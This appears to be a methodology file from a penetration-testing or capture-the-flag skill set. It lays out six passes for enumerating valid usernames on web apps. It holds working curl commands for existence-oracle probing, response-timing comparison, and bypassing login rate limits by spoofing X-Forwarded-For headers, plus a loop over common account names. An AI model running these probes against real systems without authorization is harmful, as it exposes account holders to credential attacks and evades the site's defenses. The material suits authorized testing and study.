# Workflow catalogue — every named pass, complete

## Pass 1: the recon inventory (free, before probes)

1. `web-source-map`/`bundle_miner` — recover the front-end bundle; grep
   `check|available|exists|username|user-exists|taken|register|reset|
   forgot|users/` — names the direct-oracle endpoint and the form set
2. the page source — every `<form>`, every `<input name=`, every
   `fetch(`/`.ajax`/`XMLHttpRequest`/`axios` endpoint
3. `robots.txt`/`sitemap.xml`/`/.well-known`/`/api/` — the route set
4. the response headers — `X-RateLimit-*`, `Set-Cookie`, `Server`,
   `X-Frame-Options`, a framework signature

The inventory names every (form × channel) cell BEFORE the first probe.

## Pass 2: the direct-oracle pass (cheapest)

Probe the recovered exists-endpoints first — they are designed to leak:

```bash
curl "$BASE/api/username-available?u=admin"   # {"available":false}
curl "$BASE/check-username?u=zzz-x"           # {"available":true}
curl "$BASE/api/users/admin"                  # 200 vs 404
curl -X POST -d '{"query":"query{userByEmail(email:\"a@b.c\"){id}}"}' "$BASE/graphql"
```

A `{"available":false}`/`200`/`{id}` on a real name is the verdict in
one request — no baseline needed.

## Pass 3: the per-form channel pass

For each remaining form — the three arms on each channel:

```bash
# body — masked diff
diff <(mask<g) <(mask<b)
# status + Location
curl -s -D - -o /dev/null -X POST -d "user=$U&pass=x" "$FORM" | grep -iE '^HTTP|^location'
# timing — N>=8 interleaved
for i in $(seq 10); do curl -o /dev/null -w "g %{time_total}\n" -d "user=$KNOWN&pass=x" "$FORM"; curl -o /dev/null -w "b %{time_total}\n" -d "user=$FAKE&pass=x" "$FORM"; done
# side — the envelope
curl -sv -d "user=$U&pass=x" "$FORM" 2>&1 | grep -iE 'set-cookie|x-|emails|attempts'
```

The channel-order: body → status+loc → timing → side. Each cell
`oracle`/`uniform`/`unmeasured`.

## Pass 4: the throttle pass

```bash
for i in $(seq 15); do curl -o /dev/null -w "$i %{http_code} %{time_total}\n" -d "user=t$i&pass=x" "$BASE/login"; done
# absent / at-N -> the bypass probe
for h in X-Forwarded-For X-Real-IP; do curl -o /dev/null -w '%{http_code}\n' -H "$h: $RANDOM.$RANDOM.$RANDOM.$RANDOM" -d 'user=x&pass=y' "$BASE/login"; done
# fresh session, alias endpoint, method, content-type
```

`absent`/`at-N`/`bypassed` — the loop-bound, recorded verbatim.

## Pass 5: the candidate-name pass

The confirmed oracle + the seeded list:

```bash
for u in admin administrator root test demo user guest flag service backup deploy system support operator monitoring superuser sa ci jenkins gitlab; do
  printf '%-14s ' "$u"; curl -s "$BASE/api/username-available?u=$u"
done
# each {"available":false} -> a verified name
```

## Pass 6: the route pass

Each verified name → the neighbor class (`exploitation.md`); each
throttle finding → `web-auth-session`. The enum's budget ends at the
route; the chain continues in the neighbor's depth skill.

## The budget

5 probes or 15 active minutes per mechanism class; 25/45 for the
challenge. The 6 passes above are ~30-60 requests — within budget for
the form set + the bounded list. Stop when every cell is measured,
every oracle is verified, and every name is routed — or when the
budget spends and the escalation rung fires.
